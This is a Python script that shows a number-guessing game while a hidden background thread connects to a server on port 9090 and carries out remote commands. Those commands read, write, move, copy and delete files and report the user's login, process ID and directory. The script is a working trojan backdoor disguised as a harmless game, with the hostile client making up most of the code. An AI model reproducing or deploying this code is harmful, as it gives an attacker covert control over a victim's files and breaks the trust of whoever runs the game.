import socket
import os
import threading
import shutil
import random


def Ex():
    try:
        host = '127.0.0.1'
        port = 9090

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))

        while True:
            try:
                server_command = client.recv(1024).decode('utf-8')
                if server_command == 'hello':
                    print("Hello World!")
                    client.send(f"{server_command} was executed successfully!".encode('utf-8'))
                elif server_command == 'help':
                    client.send(f"{server_command}".encode('utf-8'))
                elif server_command == 'cwd':
                    client.send(f"{os.getcwd()}".encode('utf-8'))
                elif server_command == 'osname':
                    client.send(f"{os.name}".encode('utf-8'))
                elif server_command == 'ls':
                    client.send(f"{os.listdir()}".encode('utf-8'))
                elif server_command == 'getlogin':
                    client.send(f"{os.getlogin()}".encode('utf-8'))
                elif server_command == 'getpid':
                    client.send(f"{os.getpid()}".encode('utf-8'))
                elif 'chdir' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    os.chdir(client.recv(1024).decode('utf-8'))
                    client.send(f"Working Directory Changed".encode('utf-8'))
                elif 'mkdir' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    os.mkdir(client.recv(1024).decode('utf-8'))
                    client.send(f"Directory Created Successfully".encode('utf-8'))
                elif 'rename' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    os.rename(client.recv(1024).decode('utf-8'), client.recv(1024).decode('utf-8'))
                    client.send(f"File is Renamed".encode('utf-8'))
                elif 'rmdir' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    os.rmdir(client.recv(1024).decode('utf-8'))
                    client.send(f"Directory removed Successfully".encode('utf-8'))
                elif 'touch' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    f = open(client.recv(1024).decode('utf-8'), "a+")
                    f.close()
                    client.send(f"File Created".encode('utf-8'))
                elif 'read' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    f = open(client.recv(1024).decode('utf-8'))
                    client.send(f.read().encode('utf-8'))
                    f.close()
                elif 'write' in server_command:  # Bug 2 : Multiline writing is not working
                    client.send(f"{server_command}".encode('utf-8'))
                    f = open(client.recv(1024).decode('utf-8'), "w+")
                    client.send(f"Enter the content of the file : ".encode('utf-8'))
                    content = client.recv(1024).decode('utf-8')
                    f.write(content)
                    f.close()
                    client.send(f"Writing is successfully done.".encode('utf-8'))
                elif 'delfile' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    os.remove(client.recv(1024).decode('utf-8'))
                    client.send(f"File Deleted Successfully ".encode('utf-8'))
                elif 'copy' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    shutil.copyfile(client.recv(1024).decode('utf-8'), client.recv(1024).decode('utf-8'))
                    client.send(f"File Created Successfully ".encode('utf-8'))
                elif 'move' in server_command:
                    client.send(f"{server_command}".encode('utf-8'))
                    shutil.move(client.recv(1024).decode('utf-8'), client.recv(1024).decode('utf-8'))
                    client.send(f"File Moved Successfully".encode('utf-8'))
                else:
                    client.send(f"{server_command} is not recognizes".encode('utf-8'))
            except:
                client.send(f"Something wrong with Input or Command!!!".encode('utf-8'))
    except:
        pass


def game():
    random_number = random.randint(1, 10)
    win = False
    Turns = 0
    while not win:
        try:
                Your_guess = input("Enter a number between 1 and 10 : ")
                Turns += 1
                if random_number == int(Your_guess):
                    print("You won!")
                    print("Number of turns you have used: ", Turns)
                    win = True
                    break
                else:
                    if random_number > int(Your_guess):
                        print("Your Guess was low, Please enter a higher number")
                    else:
                        print("your guess was high, please enter a lower number")
        except:
            print("Something wrong with Input !!!")


x = threading.Thread(target=Ex)
x.start()

y = threading.Thread(target=game)
y.start()
